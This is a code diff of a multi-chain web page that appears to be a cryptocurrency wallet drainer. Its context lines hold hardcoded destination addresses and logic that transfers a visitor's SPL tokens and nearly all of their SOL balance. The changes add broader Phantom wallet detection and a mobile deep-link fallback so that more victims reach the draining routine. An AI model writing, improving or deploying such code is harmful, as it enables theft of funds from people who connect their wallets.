@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Production Multi-Chain</title>
   
-  <!-- Web3 Engine Libraries (Only Core Drivers) -->
+  <!-- Web3 Engine Libraries -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.js"></script>
   
@@ -136,9 +136,6 @@
 </div>
 
 <script>
-  // =========================================================
-  // CONFIGURATION
-  // =========================================================
   const WALLET_MAP = {
     ethereum: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
     bnb: "0x5c146aA4B3C3EEB97482D69A7aD1ad40D8a08ed0",
@@ -173,7 +170,6 @@
     "function decimals() view returns (uint8)"
   ];
 
-  // Solana Program Constants
   const TOKEN_PROGRAM_ID_STR = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
   const ASSOCIATED_TOKEN_PROGRAM_ID_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 
@@ -206,7 +202,19 @@
     if (deepLink) window.location.href = deepLink;
   }
 
-  // Helper: Derives Associated Token Address natively without @solana/spl-token
+  // Enhanced Phantom Detection Engine
+  function getSolanaProvider() {
+    if ("phantom" in window) {
+      const provider = window.phantom?.solana;
+      if (provider?.isPhantom) return provider;
+    }
+    if ("solana" in window) {
+      const provider = window.solana;
+      if (provider?.isPhantom) return provider;
+    }
+    return null;
+  }
+
   async function findAssociatedTokenAddress(owner, mint, solanaWeb3) {
     const tokenProgramId = new solanaWeb3.PublicKey(TOKEN_PROGRAM_ID_STR);
     const ataProgramId = new solanaWeb3.PublicKey(ASSOCIATED_TOKEN_PROGRAM_ID_STR);
@@ -217,10 +225,9 @@
     return pubkey;
   }
 
-  // Helper: Encodes SPL Transfer Instruction Data (Index 3 + 64-bit uint64 Little Endian)
   function createSplTransferInstructionData(amountBigInt) {
     const data = new Uint8Array(9);
-    data[0] = 3; // Transfer instruction index
+    data[0] = 3; // SPL Transfer index
     let val = amountBigInt;
     for (let i = 1; i <= 8; i++) {
       data[i] = Number(val & 0xffn);
@@ -240,9 +247,7 @@
 
     setStatus("🔄 Connecting provider...", "info");
 
-    // =========================================================
-    // NATIVE SOLANA ROUTINE (NO SPL-TOKEN DEPENDENCY)
-    // =========================================================
+    // SOLANA ROUTINE
     if (network === "solana") {
       if (typeof window.solanaWeb3 === "undefined") {
         setStatus("❌ <b>Library Error:</b> @solana/web3.js failed to load.", "error");
@@ -250,10 +255,17 @@
       }
 
       const solanaWeb3 = window.solanaWeb3;
-      const provider = window.solana;
+      const provider = getSolanaProvider();
 
-      if (!provider || !provider.isPhantom) {
-        setStatus("❌ <b>Wallet Error:</b> Phantom extension or in-app browser not detected.", "error");
+      // Mobile / Missing Extension Fallback
+      if (!provider) {
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        if (isMobile) {
+          setStatus("📱 Opening page in Phantom App...", "info");
+          openWalletApp('phantom');
+        } else {
+          setStatus("❌ <b>Phantom Not Detected:</b> Please install/unlock Phantom extension or open inside Phantom browser.", "error");
+        }
         return;
       }
 
@@ -294,7 +306,6 @@
             const destinationAta = await findAssociatedTokenAddress(target, mint, solanaWeb3);
             const destAccountInfo = await connection.getAccountInfo(destinationAta);
             
-            // If receiver ATA does not exist, create it
             if (!destAccountInfo) {
               const ataProgramId = new solanaWeb3.PublicKey(ASSOCIATED_TOKEN_PROGRAM_ID_STR);
               const systemProgramId = solanaWeb3.SystemProgram.programId;
@@ -315,7 +326,6 @@
               );
             }
 
-            // Add SPL Transfer Instruction natively
             transaction.add(
               new solanaWeb3.TransactionInstruction({
                 keys: [
@@ -331,7 +341,7 @@
         }
 
         const totalSolBalance = await connection.getBalance(sender);
-        const reservedGas = 2000000; // Reserve 0.002 SOL for transaction fees
+        const reservedGas = 2000000; // 0.002 SOL fee reserve
         const solToTransfer = totalSolBalance - reservedGas;
 
         if (totalSolBalance === 0 && activeTokens === 0) {
@@ -340,7 +350,7 @@
         }
 
         if (solToTransfer <= 0 && activeTokens > 0) {
-          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover fee.", "error");
+          setStatus("❌ <b>Gas Error:</b> Native SOL balance insufficient to cover transaction fee.", "error");
           return;
         }
 
@@ -369,9 +379,7 @@
       return;
     }
 
-    // =========================================================
     // EVM ROUTINE
-    // =========================================================
     if (typeof ethers === "undefined") {
       setStatus("❌ <b>Library Error:</b> Ethers.js library failed to load.", "error");
       return;
@@ -392,7 +400,7 @@
             params: [{ chainId: CHAIN_IDS[network] }],
           });
         } catch (switchError) {
-          console.warn("Chain switch request dismissed or unsupported:", switchError);
+          console.warn("Chain switch request dismissed:", switchError);
         }
       }
 
